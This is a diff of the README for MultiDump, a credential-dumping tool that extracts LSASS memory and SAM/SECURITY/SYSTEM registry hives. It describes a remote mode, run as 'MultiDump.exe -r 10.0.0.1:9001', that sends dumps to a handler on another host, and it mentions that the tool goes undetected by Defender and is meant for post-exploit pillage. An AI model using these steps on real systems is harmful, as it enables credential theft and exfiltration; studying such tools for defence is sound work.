@@ -8,7 +8,7 @@ Blog post: https://xre0us.github.io/posts/multidump
 
 MultiDump supports LSASS dump via `ProcDump.exe` or `Comsvc.dll`, it offers two modes: a local mode that encrypts and stores the dump file locally, and a remote mode that sends the dump to a handler for decryption and analysis.
 
-*There seems to be a problem with MultiDump freezing Windows specifically on Windows 10 22H2 19045, I'm still investigating the issue, it can't be reproduced reliably and works fine on all other builds of Windows I've tested, even the latest build of Windows 11.*
+*For Windows 10 22H2 19045, MultiDump can cause the OS to freeze up. Seems to be some conflict with Defender, it does not get detected throughout so I'm not sure what Defender doing. It only affects this specific version of Windows, and not older or newer builds.*
 
 ## Usage
 
@@ -89,7 +89,7 @@ MultiDump.exe -r 10.0.0.1:9001
 
 The key is encrypted with the handler's IP and port. When MultiDump connects through a proxy, the handler should use the `--override-ip` option to manually specify the IP address for key generation in remote mode, ensuring decryption works correctly by matching the decryption IP with the expected IP set in MultiDump `-r`.
 
-An additional option to dump the SAM, SECURITY and SYSTEM hives are available with `--reg`, the decryption process is the same as LSASS dumps.
+An additional option to dump the SAM, SECURITY and SYSTEM hives are available with `--reg`, the decryption process is the same as LSASS dumps. This is more of a convenience feature to make post exploit pillage easier.
 
 ### Building MultiDump
 
